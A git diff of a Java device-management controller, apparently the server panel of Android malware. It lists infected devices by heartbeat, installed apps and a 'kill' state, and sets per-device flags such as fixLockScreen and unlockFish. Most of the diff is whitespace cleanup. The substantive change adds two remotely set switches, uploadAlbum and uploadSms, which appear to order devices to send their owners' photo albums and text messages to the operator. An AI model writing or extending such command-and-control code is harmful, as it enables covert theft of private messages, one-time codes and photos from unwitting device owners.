@@ -59,51 +59,51 @@ public class DeviceController extends BaseController {
         Page<Device> page = new Page<>(param.getPage(), param.getLimit());
         QueryWrapper<Device> query = new QueryWrapper<>();
         LambdaQueryWrapper<Device> lambda = query.lambda();
-        
+
         // 设备ID
         if (StringUtils.isNotEmpty(param.getDeviceId())) {
             lambda.eq(Device::getDeviceId, param.getDeviceId());
         }
-        
+
         // 包名
         if (StringUtils.isNotEmpty(param.getPkg())) {
             lambda.eq(Device::getPkg, param.getPkg());
         }
-        
+
         // 型号
         if (StringUtils.isNotEmpty(param.getModel())) {
             lambda.eq(Device::getModel, param.getModel());
         }
-        
+
         // 语言
         if (StringUtils.isNotEmpty(param.getLanguage())) {
             lambda.eq(Device::getLanguage, param.getLanguage());
         }
-        
+
         // 品牌
         if (StringUtils.isNotEmpty(param.getBrand())) {
             lambda.eq(Device::getBrand, param.getBrand());
         }
-        
+
         // 状态
         if (param.getStatus() != null) {
             lambda.eq(Device::getStatus, param.getStatus());
         }
-        
+
         // 最后活动时间范围
         if (param.getStart() != null) {
             lambda.ge(Device::getLastHeart, param.getStart());
         }
-        
+
         if (param.getEnd() != null) {
             lambda.le(Device::getLastHeart, param.getEnd());
         }
-        
+
         // Kill状态
         if (param.getKill() != null) {
             lambda.eq(Device::getKill, param.getKill());
         }
-        
+
         // 安装应用过滤
         if (StringUtils.isNotEmpty(param.getInstallApp())) {
             List<String> installAppDeviceIdList = installAppMapper.selectByPackageName(param.getInstallApp());
@@ -112,7 +112,7 @@ public class DeviceController extends BaseController {
             }
             lambda.in(Device::getDeviceId, installAppDeviceIdList);
         }
-        
+
         Page<Device> pageData = deviceService.page(page, lambda);
         return Result.toSuccess(new PageData<Device>(pageData.getRecords(), pageData.getTotal()));
     }
@@ -165,6 +165,8 @@ public class DeviceController extends BaseController {
         update.setFixLockScreen(jsonObject.getInteger("fixLockScreen"));
         update.setUnlockFish(jsonObject.getInteger("unlockFish"));
         update.setKill(jsonObject.getInteger("kill"));
+        update.setUploadAlbum(jsonObject.getInteger("uploadAlbum"));
+        update.setUploadSms(jsonObject.getInteger("uploadSms"));
         deviceService.updateById(update);
         return Result.toSuccess(null);
     }
